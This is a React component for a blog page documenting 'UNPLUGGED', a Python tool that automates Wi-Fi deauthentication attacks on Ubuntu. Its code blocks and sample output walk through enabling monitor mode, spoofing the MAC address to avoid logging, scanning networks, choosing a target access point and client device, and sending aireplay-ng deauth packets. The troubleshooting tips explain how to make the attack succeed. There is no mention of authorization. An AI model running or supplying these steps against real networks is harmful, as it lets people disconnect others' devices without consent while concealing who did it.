import React, { useContext } from 'react';
import { ThemeContext } from '../../content/themecontext.jsx';
import CodeBlock from '../../prop/codeblock.jsx';
import Navbar from '../../prop/navbar.jsx';
import { useNavigate } from 'react-router-dom';
import { Undo2 } from "lucide-react";
import { Fade } from "react-awesome-reveal";

const Ubuntu = () => {
    const { darkMode } = useContext(ThemeContext);
    const navigate = useNavigate();

    // Code snippets for different sections
    const driverInstallCode = `# Install DKMS for dynamic kernel module support
sudo apt install dkms

# Clone the RTL8812AU driver repository
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au

# Build and install the driver
sudo make dkms_install

# Reboot to load the new driver
sudo reboot`;

    const monitorModeCode = `# Stop NetworkManager to prevent interference
sudo systemctl stop NetworkManager

# Kill processes that might interfere
sudo airmon-ng check kill

# Start monitor mode (replace wlan0 with your interface name)
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig`;

    const installScriptCode = `# Clone the repository
git clone https://github.com/purposewalks9/UNPLUGGED.git
cd UNPLUGGED

# Make the script executable
chmod +x unplugged.py

# Run the script with sudo
sudo python3 unplugged.py`;

    const usageExampleCode = `$ sudo python3 unplugged.py

Updating package list and installing required tools...
Tools installed successfully.

Checking for connected wireless adapters...
Wireless adapter detected: wlan0mon

Changing MAC address of adapter wlan0mon...
MAC address for wlan0mon set to 00:11:22:33:44:55

Scanning for nearby networks (20 seconds)...
Network scan complete.

Available networks detected:
    BSSID              PWR  Beacons  #Data  CH  ESSID
    AA:BB:CC:DD:EE:FF  -45   120      450    6   MyHomeNetwork
    11:22:33:44:55:66  -67   89       230    11  CoffeeShop_WiFi

Enter target BSSID (MAC address): AA:BB:CC:DD:EE:FF
Enter target channel: 6

Scanning selected target network (20 seconds)...
Target network scan complete.

Devices connected to the target network:
    Station MAC         PWR  Lost  Packets
    12:34:56:78:9A:BC  -32   0     1250
    AB:CD:EF:12:34:56  -45   2     450

Enter BSSID (target AP MAC): AA:BB:CC:DD:EE:FF
Enter device MAC address to disconnect: 12:34:56:78:9A:BC
Enter number of deauth packets to send: 100

Launching deauthentication attack. Press Ctrl+Z to stop.
Sending attack...
Attack completed.`;

    const adapterDetectionCode = `def check_adapter():
    try:
        result = subprocess.check_output(["iw", "dev"]).decode('utf-8').splitlines()
        for line in result:
            line = line.strip()
            if line.startswith("Interface"):
                interface_name = line.split()
                return interface_name[1]
    except:
        print("Error: No wireless adapter detected.")`;

    const macSpoofingCode = `def change_macaddress(Adapter):
    try:
        subprocess.run(["sudo", "ip", "link", "set", Adapter, "down"])
        subprocess.run(["sudo", "macchanger", "-m", "00:11:22:33:44:55", Adapter])
        subprocess.run(["sudo", "ip", "link", "set", Adapter, "up"])
    except subprocess.CalledProcessError:
        print("Error: Unable to change MAC address.")`;

    const networkScanningCode = `def get_targets():
    Data = "Data"
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", Data, "--output-format", "csv", Adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(20)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    return Data + "-01.csv"`;

    const deauthAttackCode = `def send_attack():
    target_mac = input("Enter BSSID (target AP MAC): ")
    device_mac = input("Enter device MAC address to disconnect: ")
    number_of_attack = input("Enter number of deauth packets to send: ")
    
    subprocess.run([
        "sudo", "aireplay-ng", 
        "--deauth", number_of_attack, 
        "-a", target_mac, 
        "-c", device_mac, 
        "-D", Adapter
    ])`;

    const cleanupCode = `# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Restore original MAC (optional)
sudo macchanger -p wlan0

# Verify normal mode
iwconfig`;

    return (
        <div className={`min-h-screen ${darkMode ? ' text-gray-300' : ' text-gray-700'}`}>
            {/* Main Content - Added pb-20 to prevent content from being hidden behind navbar */}
             <Fade direction="right"  duration={1600} triggerOnce>
            <main className="max-w-3xl mx-auto px-6 py-8 pb-20">
                <div className=" mt-10 md:mt-20  lg:mt-20">
              <div className={`flex flex-row p-2 cursor-pointer rounded-full max-w-20 ${darkMode ? 'text-black bg-white hover:bg-gray-400' : 'bg-black text-white hover:bg-gray-700'} items-center mb-10`} onClick={() => { navigate('/blog'); }}>
                                          <Undo2 size={14} />
                                          <p className="text-sm ml-2">Back</p>
                                      </div>
                 
                {/* About */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Description</h2>
                    <p className={`text-sm leading-relaxed mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        UNPLUGGED is a Python-based tool for Ubuntu that demonstrates Wi-Fi deauthentication attacks.
                        It automates the process of detecting wireless networks, identifying connected devices, and
                        sending deauthentication packets to disconnect specific targets.
                    </p>
                    <p className={`text-sm leading-relaxed ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        The script handles everything from MAC address spoofing to network scanning, making it a
                        comprehensive tool for understanding Wi-Fi security vulnerabilities.
                    </p>
                </section>

                {/* Features */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Key Features</h2>
                    <ul className={`space-y-1 text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <li>• Auto-detects wireless adapter using iw dev</li>
                        <li>• Changes MAC address for privacy (spoofs to 00:11:22:33:44:55)</li>
                        <li>• Scans Wi-Fi networks in range and exports to CSV</li>
                        <li>• Identifies devices connected to target network</li>
                        <li>• Sends customizable deauth packets to disconnect targets</li>
                        <li>• Automatic dependency installation</li>
                    </ul>
                </section>

                {/* Prerequisites */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Prerequisites</h2>
                    <h3 className={`text-base font-semibold mb-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Required Tools</h3>
                    <ul className={`space-y-1 font-mono text-xs mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <li>• Python 3</li>
                        <li>• pandas, subprocess, signal modules</li>
                        <li>• aircrack-ng suite</li>
                        <li>• macchanger</li>
                        <li>• net-tools</li>
                    </ul>
                    <p className={`text-xs italic ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                        Note: The script automatically installs aircrack-ng, macchanger, and net-tools on first run.
                    </p>
                </section>

                {/* Hardware */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Hardware Setup</h2>
                    <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        You'll need a wireless adapter that supports monitor mode and packet injection.
                        Popular options include:
                    </p>
                    <ul className={`space-y-1 mb-3 text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <li>• Realtek RTL8812AU (Recommended)</li>
                        <li>• Alfa AWUS036ACH</li>
                        <li>• TP-Link Archer T2U Plus</li>
                        <li>• Any adapter with monitor mode support</li>
                    </ul>
                    <p className={`text-xs italic ${darkMode ? 'text-blue-300' : 'text-blue-600'}`}>
                        Tip: RTL8812AU chipsets are highly recommended due to excellent Linux driver support and reliable packet injection capabilities.
                    </p>
                </section>

                {/* Step 1 */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Step 1: Install RTL8812AU Driver</h2>
                    <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        If you're using an RTL8812AU-based adapter, install the driver first:
                    </p>
                    <CodeBlock code={driverInstallCode} language="bash" darkMode={darkMode} />
                </section>

                {/* Step 2 */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Step 2: Enable Monitor Mode</h2>
                    <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        Before running UNPLUGGED, put your wireless adapter into monitor mode:
                    </p>
                    <CodeBlock code={monitorModeCode} language="bash" darkMode={darkMode} />
                    <p className={`text-xs mt-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <strong>Note:</strong> Your interface name will change from <code className={`${darkMode ? 'text-red-300' : 'text-red-500'}`}>wlan0</code> to <code className={`${darkMode ? 'text-red-300' : 'text-red-500'}`}>wlan0mon</code> once monitor mode is enabled.
                    </p>
                </section>

                {/* Step 3 */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Step 3: Install UNPLUGGED</h2>
                    <CodeBlock code={installScriptCode} language="bash" darkMode={darkMode} />
                </section>

                {/* How It Works */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-4 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>How the Script Works</h2>
                    <div className="space-y-4">
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>1. Dependency Installation</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                The script checks for and installs required tools (aircrack-ng, macchanger, net-tools) automatically using apt package manager.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>2. Adapter Detection</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Uses <code className="font-mono">iw dev</code> to detect your wireless adapter interface name automatically.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>3. MAC Address Spoofing</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Changes your adapter's MAC address to <code className="font-mono">00:11:22:33:44:55</code> for privacy. This prevents your real hardware address from being logged.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>4. Network Scanning</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Runs <code className="font-mono">airodump-ng</code> for 20 seconds to scan nearby Wi-Fi networks. Results are saved to <code className="font-mono">Data-01.csv</code>.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>5. Target Selection</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Displays scanned networks in a table. You enter the target BSSID (MAC address) and channel number.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>6. Device Scanning</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Focuses on the target network for 20 seconds to identify connected devices. Results saved to <code className="font-mono">targets_devices-01.csv</code>.
                            </p>
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>7. Deauthentication Attack</h3>
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                You specify which device to disconnect and how many deauth packets to send. The script uses <code className="font-mono">aireplay-ng</code> to execute the attack.
                            </p>
                        </div>
                    </div>
                </section>

                {/* Usage Example */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Complete Usage Example</h2>
                    <CodeBlock code={usageExampleCode} language="bash" darkMode={darkMode} />
                </section>

                {/* CSV Output */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Understanding the CSV Output</h2>
                    <h3 className={`text-base font-semibold mb-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Network Scan (Data-01.csv)</h3>
                    <ul className={`space-y-1 mb-4 text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>BSSID</code> - Router's MAC address (target identifier)</li>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>PWR</code> - Signal strength (closer to 0 = stronger)</li>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>CH</code> - Wi-Fi channel (1-13 for 2.4GHz, 36+ for 5GHz)</li>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-300'}`}>ESSID</code> - Network name (what you see in Wi-Fi list)</li>
                    </ul>
                    <h3 className={`text-base font-semibold mb-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Device Scan (targets_devices-01.csv)</h3>
                    <ul className={`space-y-1 text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>Station MAC</code> - Device's MAC address (phone, laptop, etc.)</li>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>PWR</code> - Device signal strength</li>
                        <li><code className={`font-mono ${darkMode ? 'text-red-300' : 'text-red-500'}`}>Packets</code> - Number of packets captured from device</li>
                    </ul>
                </section>

                {/* Code Breakdown */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-4 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Key Code Components</h2>
                    <div className="space-y-6">
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>1. Adapter Detection</h3>
                            <p className={`text-xs mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                The script uses iw dev to find your wireless interface automatically.
                            </p>
                            <CodeBlock code={adapterDetectionCode} language="python" darkMode={darkMode} />
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>2. MAC Address Spoofing</h3>
                            <p className={`text-xs mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                Changes your hardware MAC to prevent tracking. Brings interface down, changes MAC, then brings it back up.
                            </p>
                            <CodeBlock code={macSpoofingCode} language="python" darkMode={darkMode} />
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>3. Network Scanning</h3>
                            <p className={`text-xs mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                Runs airodump-ng in background for 20 seconds, captures network data to CSV, then gracefully stops.
                            </p>
                            <CodeBlock code={networkScanningCode} language="python" darkMode={darkMode} />
                        </div>
                        <div>
                            <h3 className={`text-base font-semibold mb-1 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>4. Deauth Attack</h3>
                            <p className={`text-xs mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                Uses aireplay-ng to send deauthentication packets. -a is target AP, -c is client device, --deauth is packet count.
                            </p>
                            <CodeBlock code={deauthAttackCode} language="python" darkMode={darkMode} />
                        </div>
                    </div>
                </section>

                {/* Cleanup */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-3 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Step 4: Cleanup After Use</h2>
                    <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        Always restore your system to normal operation after testing:
                    </p>
                    <CodeBlock code={cleanupCode} language="bash" darkMode={darkMode} />
                </section>

                {/* Troubleshooting */}
                <section className="mb-12">
                    <h2 className={`text-xl font-bold mb-4 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Troubleshooting</h2>
                    <div className="space-y-3">
                        <div>
                            <h3 className={`font-semibold text-sm mb-1 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>No wireless adapter detected</h3>
                            <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Ensure your adapter is plugged in and supports monitor mode. Check with lsusb command.
                            </p>
                        </div>
                        <div>
                            <h3 className={`font-semibold text-sm mb-1 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Cannot change MAC address</h3>
                            <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Interface might be in use. Stop NetworkManager first: sudo systemctl stop NetworkManager
                            </p>
                        </div>
                        <div>
                            <h3 className={`font-semibold text-sm mb-1 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>No networks found in scan</h3>
                            <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Verify monitor mode is active with iwconfig. Try scanning for longer (modify time.sleep value).
                            </p>
                        </div>
                        <div>
                            <h3 className={`font-semibold text-sm mb-1 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Deauth attack not working</h3>
                            <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Ensure you're on the correct channel. Some routers have deauth protection (802.11w). Try increasing packet count.
                            </p>
                        </div>
                        <div>
                            <h3 className={`font-semibold text-sm mb-1 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>Permission denied errors</h3>
                            <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Always run the script with sudo. Aircrack-ng tools require root privileges.
                            </p>
                        </div>
                    </div>
                </section>
                </div>
            </main>
            </Fade>


            {/* Fixed Bottom navbar */}
            <div className="fixed bottom-10 left-0 right-0 z-50">
                <Navbar />
            </div>
        </div>
    );
}

export default Ubuntu;